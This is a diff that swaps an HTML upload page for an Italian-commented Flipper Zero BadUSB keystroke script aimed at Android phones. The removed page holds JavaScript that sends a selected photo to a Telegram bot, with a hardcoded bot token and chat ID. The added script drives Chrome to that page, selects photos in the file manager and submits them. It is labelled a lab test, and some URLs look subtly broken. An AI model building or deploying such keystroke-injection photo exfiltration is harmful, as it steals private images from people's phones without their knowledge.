@@ -1,37 +1,66 @@
-<!DOCTYPE html>
-<html lang="it">
-<head>
-    <meta charset="UTF-8">
-    <title>Test Caricamento</title>
-</head>
-<body>
-    <!-- Form minimale per la BadUSB -->
-    <form id="uploadForm">
-        <input type="file" id="fotoInput" name="photo" accept="image/*,video/*">
-        <input type="button" value="Invia" id="btnInvia" onclick="inviaAFTelegram()">
-    </form>
+ID 1234:5678
+LAYOUT it
+REM ----------------------------------------------------
+REM LAB TEST FLIPPER ZERO: ESTRAZIONE FOTO VIA TELEGRAM
+REM ----------------------------------------------------
 
-    <script>
-        function inviaAFTelegram() {
-            // SOSTITUISCI CON IL TUO TOKEN E IL TUO CHAT ID
-            const token = "8859627744:AAET9vqRCTH34_PBN6lNr5gstBapm4oTKBU";
-            const chatId = "666777835";
-            
-            const fileInput = document.getElementById('fotoInput');
-            if (fileInput.files.length === 0) return;
+REM Attesa iniziale per il collegamento dell'hardware
+DELAY 3000
 
-            const formData = new FormData();
-            formData.append("chat_id", chatId);
-            formData.append("photo", fileInput.files[0]);
+REM Apre la ricerca globale delle app su Android
+GUI SPACE
+DELAY 1200
 
-            // Utilizza le API native di Telegram per l'invio delle foto
-            fetch(`https://telegram.org{token}/sendPhoto`, {
-                method: "POST",
-                body: formData
-            })
-            .then(response => alert("Inviato!"))
-            .catch(error => console.error("Errore:", error));
-        }
-    </script>
-</body>
-</html>
+REM Cerca Google Chrome ed entra
+STRING chrome
+DELAY 800
+ENTER
+DELAY 3000
+
+REM Seleziona la barra degli indirizzi di Chrome
+CTRL l
+DELAY 800
+
+REM Digita l'indirizzo della tua pagina su GitHub Pages
+REM !!! SOSTITUISCI CON IL TUO VERO URL !!!
+STRING https://github.com/dpontiero1-coder/ilduca24.git
+DELAY 1000
+ENTER
+
+REM Aspetta che la pagina web su GitHub si carichi
+DELAY 5000
+
+REM Spostati sul pulsante di selezione dei file (Sfoglia)
+TAB
+DELAY 500
+ENTER
+DELAY 3000
+
+REM Naviga nel gestore file nativo di Android per evidenziare la prima foto
+TAB
+DELAY 600
+DOWN
+DELAY 600
+
+REM Esegue la pressione prolungata (Long Press) per attivare la selezione multipla
+HOLD ENTER
+DELAY 1800
+RELEASE ENTER
+DELAY 1200
+
+REM Si sposta sulla seconda foto a destra e la seleziona
+RIGHT
+DELAY 500
+SPACE
+DELAY 1000
+
+REM Torna in alto sul pulsante di conferma del gestore file Android
+SHIFT TAB
+DELAY 600
+ENTER
+DELAY 3000
+
+REM Si sposta sul pulsante "Invia" del form HTML per attivare il Bot Telegram
+TAB
+DELAY 600
+ENTER
